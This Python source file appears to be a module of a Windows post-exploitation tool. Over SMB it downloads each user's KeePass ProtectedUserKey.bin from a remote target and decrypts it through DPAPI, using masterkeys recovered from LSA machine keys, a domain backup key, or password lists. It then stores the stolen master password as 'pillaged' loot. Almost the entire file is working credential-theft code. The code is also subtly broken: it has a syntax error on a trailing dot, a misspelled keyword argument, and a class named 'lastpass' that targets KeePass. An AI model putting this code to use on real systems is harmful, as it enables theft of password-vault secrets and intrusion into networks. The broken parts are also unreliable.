#%UserProfile%\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0

'''decryption info comes from From Triage.cs of SharpDPAPI - HarmJ0y <3
voir aussi l'utilisation avec keytheft https://github.com/GhostPack/KeeThief'''

import ntpath
import LnkParse3
from lib.toolbox import bcolors
from lib.fileops import MyFileOps
import copy
from lib.dpapi import *
from impacket.uuid import string_to_bin

class lastpass():
    def __init__(self,smb,myregops,myfileops,logger,options,db,users):
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db
        self.users = users
        self.smb = smb
        self.keepass_password = None


    def run(self):
        self.get_files()
        #self.process_files()
        #self.decrypt_all()

    def get_files(self):
        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering New Module Secrets {bcolors.ENDC}")
        blacklist = ['.', '..']

        user_directories = [("Users\\{username}\\AppData\\Roaming\\KeePass\\", ('ProtectedUserKey.bin')),
                            ]
        machine_directories = []

        for user in self.users:
            self.logging.debug(
                f"[{self.options.target_ip}] Looking for {user.username} ")
            if user.username == 'MACHINE$':
                directories_to_use = machine_directories
                continue
            else:
                directories_to_use = user_directories

            for info in directories_to_use:
                my_dir, my_mask = info
                tmp_pwd = my_dir.format(username=user.username)
                self.logging.debug(f"[{self.options.target_ip}] Looking for {user.username} files in {tmp_pwd} with mask {my_mask}")
                for mask in my_mask:
                    my_directory = self.myfileops.do_ls(tmp_pwd, mask, display=False)
                    for infos in my_directory:
                        longname, is_directory = infos
                        self.logging.debug("ls returned file %s" % longname)
                        if longname not in blacklist and not is_directory:
                            try:
                                # Downloading file
                                localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname), allow_access_error=True)
                                self.process_file(localfile,user,longname)
                            except Exception as ex:
                                self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in DownloadFile {localfile}{bcolors.ENDC}")
                                self.logging.debug(ex)



    def process_file(self,localfile,user,longname):
        '''
            public static void TriageKeePassKeyFile(Dictionary<string, string> MasterKeys, string keyFilePath = "", bool unprotect = false) {
            
            if (!File.Exists(keyFilePath))
                return;

            var lastAccessed = File.GetLastAccessTime(keyFilePath);
            var lastModified = File.GetLastWriteTime(keyFilePath);

            Console.WriteLine("    File             : {0}", keyFilePath);
            Console.WriteLine("    Accessed         : {0}", lastAccessed);
            Console.WriteLine("    Modified         : {0}", lastModified);

            byte[] keyFileBytes = File.ReadAllBytes(keyFilePath);

            // entropy from KeePass source https://fossies.org/windows/misc/KeePass-2.47-Source.zip/KeePassLib/Keys/KcpUserAccount.cs (lines 44-47)
            byte[] keyBytes = Dpapi.DescribeDPAPIBlob(keyFileBytes, MasterKeys, "keepass", unprotect, Helpers.ConvertHexStringToByteArray("DE135B5F18A34670B2572429698898E6"));
            if(keyBytes.Length > 0)
            {
                Console.WriteLine("    Key Bytes        : {0}", BitConverter.ToString(keyBytes).Replace("-"," "));
            }
        }
        '''
        try:

            myoptions = copy.deepcopy(self.options)
            myoptions.file = localfile  # Masterkeyfile to parse
            myoptions.masterkeys = None  # user.masterkeys_file
            myoptions.key = None
            mydpapi = DPAPI(myoptions, self.logging)
            guid = mydpapi.find_CredentialFile_masterkey()
            self.logging.debug(f"[{self.options.target_ip}] Looking for {longname} masterkey : {guid}")
            if guid != None:
                masterkey = self.get_masterkey(user=user, guid=guid, type='DOMAIN')
                if masterkey != None:
                    if masterkey['status'] == 'decrypted':
                        mydpapi.options.key = masterkey['key'].
                        cred_data = mydpapi.decrypt_blob(entropy=string_to_bin('DE135B5F18A34670B2572429698898E6'))
                        if cred_data != None:
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull of {bcolors.OKBLUE}{user.username}{bcolors.ENDC} KeePass Password {longname}{bcolors.ENDC}")
                            user.files[longname]['status'] = 'decrypted'
                            user.files[longname]['data'] = cred_data
                            self.db.add_credz(credz_type='KEEPASS-MASTERKEY',credz_username=user.username.decode('utf-8'),redz_password=cred_data.decode('utf-8'),credz_target='',credz_path=localfile,pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=user.username)
                            self.keepass_password=cred_data.decode('utf-8')
                        else:
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey{bcolors.ENDC}")
                    else:
                        self.logging.debug(
                            f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey - Masterkey not decrypted{bcolors.ENDC}")
                else:
                    self.logging.debug(
                        f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey- cant get masterkey {guid}{bcolors.ENDC}")
            else:
                self.logging.debug(
                    f"[{self.options.target_ip}] {bcolors.WARNING}Error decrypting Blob for {localfile} with Masterkey - can t get the GUID of masterkey from blob file{bcolors.ENDC}")

            return 1
        except Exception as ex:
            self.logging.debug(
                f"[{self.options.target_ip}] {bcolors.WARNING}Exception in ProcessFile {localfile}{bcolors.ENDC}")
            self.logging.debug(ex)

    def get_masterkey(self, user, guid, type):
        guid = guid.lower()
        if guid not in user.masterkeys_file:
            self.logging.debug(
                f"[{self.options.target_ip}] [!] {bcolors.FAIL}{user.username}{bcolors.ENDC} masterkey {guid} not found")
            return -1
        else:
            self.logging.debug(
                f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} Found")
        if user.masterkeys_file[guid]['status'] == 'decrypted':
            self.logging.debug(
                f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} already decrypted")
            return user.masterkeys_file[guid]
        elif user.masterkeys_file[guid]['status'] == 'encrypted':
            return self.decrypt_masterkey(user, guid, type)

    def decrypt_masterkey(self, user, guid, type=''):
        self.logging.debug(
            f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} of type {type} (type_validated={user.type_validated}/user.type={user.type})")
        guid = guid.lower()
        if guid not in user.masterkeys_file:
            self.logging.debug(
                f"[{self.options.target_ip}] [!] {bcolors.FAIL}{user.username}{bcolors.ENDC} masterkey {guid} not found")
            return -1
        localfile = user.masterkeys_file[guid]['path']

        if user.masterkeys_file[guid]['status'] == 'decrypted':
            self.logging.debug(
                f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} already decrypted")
            return user.masterkeys_file[guid]
        else:
            if user.type_validated == True:
                type = user.type

            if type == 'MACHINE':
                # Try de decrypt masterkey file
                for key in self.machine_key:
                    self.logging.debug(
                        f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with MACHINE_Key from LSA {key.decode('utf-8')}")
                    try:
                        myoptions = copy.deepcopy(self.options)
                        myoptions.sid = None  # user.sid
                        myoptions.username = user.username
                        myoptions.pvk = None
                        myoptions.file = localfile  # Masterkeyfile to parse
                        myoptions.key = key.decode("utf-8")
                        mydpapi = DPAPI(myoptions, self.logging)
                        decrypted_masterkey = mydpapi.decrypt_masterkey()
                        if decrypted_masterkey != None and decrypted_masterkey != -1:
                            # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}[...] Maserkey {bcolors.ENDC}{localfile}  {bcolors.ENDC}: {decrypted_masterkey}" )
                            user.masterkeys_file[guid]['status'] = 'decrypted'
                            user.masterkeys_file[guid]['key'] = decrypted_masterkey
                            # user.masterkeys[localfile] = decrypted_masterkey
                            user.type = 'MACHINE'
                            user.type_validated = True
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for Machine {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
                            self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                                     status=user.masterkeys_file[guid]['status'],
                                                     decrypted_with="MACHINE-KEY", decrypted_value=decrypted_masterkey,
                                                     pillaged_from_computer_ip=self.options.target_ip,
                                                     pillaged_from_username=user.username)
                            return user.masterkeys_file[guid]
                        else:
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.WARNING} MACHINE-Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid}{bcolors.ENDC}")
                    except Exception as ex:
                        self.logging.debug(
                            f"[{self.options.target_ip}] Exception {bcolors.WARNING} MACHINE-Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid}{bcolors.ENDC}")
                        self.logging.debug(ex)
                else:
                    if user.type_validated == False:
                        self.decrypt_masterkey(user, guid, type='MACHINE-USER')

            elif type == 'MACHINE-USER':
                # Try de decrypt masterkey file
                for key in self.user_key:
                    self.logging.debug(
                        f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with MACHINE-USER_Key from LSA {key.decode('utf-8')}")  # and SID %s , user.sid ))
                    try:
                        # key1, key2 = deriveKeysFromUserkey(tsid, userkey)
                        myoptions = copy.deepcopy(self.options)
                        myoptions.file = localfile  # Masterkeyfile to parse
                        if user.is_adconnect is True:
                            myoptions.key = key.decode("utf-8")
                            myoptions.sid = user.sid
                        else:
                            myoptions.key = key.decode("utf-8")  # None
                            myoptions.sid = None  # user.sid

                        myoptions.username = user.username
                        myoptions.pvk = None
                        mydpapi = DPAPI(myoptions, self.logging)
                        decrypted_masterkey = mydpapi.decrypt_masterkey()
                        if decrypted_masterkey != -1 and decrypted_masterkey != None:
                            # self.logging.debug(f"[{self.options.target_ip}] Decryption successfull {bcolors.ENDC}: {decrypted_masterkey}")
                            user.masterkeys_file[guid]['status'] = 'decrypted'
                            user.masterkeys_file[guid]['key'] = decrypted_masterkey
                            # user.masterkeys[localfile] = decrypted_masterkey
                            user.type = 'MACHINE-USER'
                            user.type_validated = True
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for Machine {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
                            self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                                     status=user.masterkeys_file[guid]['status'],
                                                     decrypted_with="MACHINE-USER", decrypted_value=decrypted_masterkey,
                                                     pillaged_from_computer_ip=self.options.target_ip,
                                                     pillaged_from_username=user.username)
                            return user.masterkeys_file[guid]
                        else:
                            self.logging.debug(
                                f"[{self.options.target_ip}] {bcolors.WARNING} MACHINE-USER_Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING}  Masterkey {guid}{bcolors.ENDC}")
                    except Exception as ex:
                        self.logging.debug(
                            f"[{self.options.target_ip}] Exception {bcolors.WARNING} MACHINE-USER_Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING}  Masterkey {guid}{bcolors.ENDC}")
                        self.logging.debug(ex)
                else:
                    if user.type_validated == False and not user.is_adconnect:
                        return self.decrypt_masterkey(user, guid, type='DOMAIN')

            elif type == 'DOMAIN' and self.options.pvk is not None:
                # For ADConnect
                if user.is_adconnect is True:
                    return self.decrypt_masterkey(user, guid, type='MACHINE-USER')
                # Try de decrypt masterkey file
                self.logging.debug(
                    f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey {self.options.pvk}")
                try:
                    myoptions = copy.deepcopy(self.options)
                    myoptions.file = localfile  # Masterkeyfile to parse
                    myoptions.username = user.username
                    myoptions.sid = user.sid
                    mydpapi = DPAPI(myoptions, self.logging)
                    decrypted_masterkey = mydpapi.decrypt_masterkey()
                    if decrypted_masterkey != -1 and decrypted_masterkey != None:
                        # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: %s" % decrypted_masterkey)
                        user.masterkeys_file[guid]['status'] = 'decrypted'
                        user.masterkeys_file[guid]['key'] = decrypted_masterkey
                        # user.masterkeys[localfile] = decrypted_masterkey
                        user.type = 'DOMAIN'
                        user.type_validated = True
                        self.logging.debug(
                            f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for user {bcolors.OKBLUE} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
                        self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                                 status=user.masterkeys_file[guid]['status'],
                                                 decrypted_with="DOMAIN-PVK",
                                                 decrypted_value=decrypted_masterkey,
                                                 pillaged_from_computer_ip=self.options.target_ip,
                                                 pillaged_from_username=user.username)
                        return user.masterkeys_file[guid]
                    else:
                        self.logging.debug(
                            f"[{self.options.target_ip}] {bcolors.WARNING}Domain Backupkey {self.options.pvk} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING} Masterkey {guid} -> Checking with Local user with credz{bcolors.ENDC}")
                        if user.type_validated == False:
                            return self.decrypt_masterkey(user, guid, 'LOCAL')
                except Exception as ex:
                    self.logging.debug(
                        f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey (most likely user is only local user) -> Running for Local user with credz{bcolors.ENDC}")
                    self.logging.debug(f"exception was : {ex}")
                    if user.type_validated == False:
                        return self.decrypt_masterkey(user, guid, 'LOCAL')

            # type==LOCAL
            # On a des credz
            if len(self.options.credz) > 0 and user.masterkeys_file[guid][
                'status'] != 'decrypted':  # localfile not in user.masterkeys:
                self.logging.debug(
                    f"[{self.options.target_ip}] [...] Testing decoding {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with credz")
                for username in self.options.credz:
                    if username in user.username:  # pour fonctionner aussi avec le .domain ou les sessions multiple citrix en user.domain.001 ?
                        self.logging.debug(
                            f"[{self.options.target_ip}] [...] Testing {len(self.options.credz[user.username])} credz for user {user.username}")
                        # for test_cred in self.options.credz[user.username]:
                        try:
                            self.logging.debug(
                                f"[{self.options.target_ip}]Trying to decrypt {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with user SID {user.sid} and {len(self.options.credz[username])}credential(s) from credz file")
                            myoptions = copy.deepcopy(self.options)
                            myoptions.file = localfile  # Masterkeyfile to parse
                            # myoptions.password = self.options.credz[username]
                            myoptions.sid = user.sid
                            myoptions.pvk = None
                            myoptions.key = None
                            mydpapi = DPAPI(myoptions, self.logging)
                            decrypted_masterkey = mydpapi.decrypt_masterkey(passwords=self.options.credz[username])
                            if decrypted_masterkey != -1 and decrypted_masterkey != None:
                                # self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: {decrypted_masterkey}")
                                user.masterkeys_file[guid]['status'] = 'decrypted'
                                user.masterkeys_file[guid]['key'] = decrypted_masterkey
                                # user.masterkeys[localfile] = decrypted_masterkey
                                user.type = 'LOCAL'
                                user.type_validated = True
                                self.logging.debug(
                                    f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for User {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
                                self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                                         status=user.masterkeys_file[guid]['status'],
                                                         decrypted_with=f"Password:{self.options.credz[username]}",
                                                         decrypted_value=decrypted_masterkey,
                                                         pillaged_from_computer_ip=self.options.target_ip,
                                                         pillaged_from_username=user.username)
                                return user.masterkeys_file[guid]
                            else:
                                self.logging.debug(
                                    f"[{self.options.target_ip}] error decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey  {guid} with {len(self.options.credz[username])} passwords from user {username} in cred list")
                        except Exception as ex:
                            self.logging.debug(
                                f"[{self.options.target_ip}] Except decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey with {len(self.options.credz[username])} passwords from user {username} in cred list")
                            self.logging.debug(ex)
                else:
                    self.logging.debug(
                        f"[{self.options.target_ip}] {bcolors.FAIL}no credential in credz file for user {user.username} and masterkey {guid} {bcolors.ENDC}")
            # on a pas su le dechiffrer, mais on conseve la masterkey
            '''if localfile not in user.masterkeys:
				user.masterkeys[localfile] = None'''
            if user.masterkeys_file[guid]['status'] == 'encrypted':
                user.masterkeys_file[guid]['status'] = 'decryption_failed'
                self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
                                         status=user.masterkeys_file[guid]['status'], decrypted_with='',
                                         decrypted_value='',
                                         pillaged_from_computer_ip=self.options.target_ip,
                                         pillaged_from_username=user.username)
                return -1
            elif user.masterkeys_file[guid]['status'] == 'decrypted':  # Should'nt go here
                return user.masterkeys_file[guid]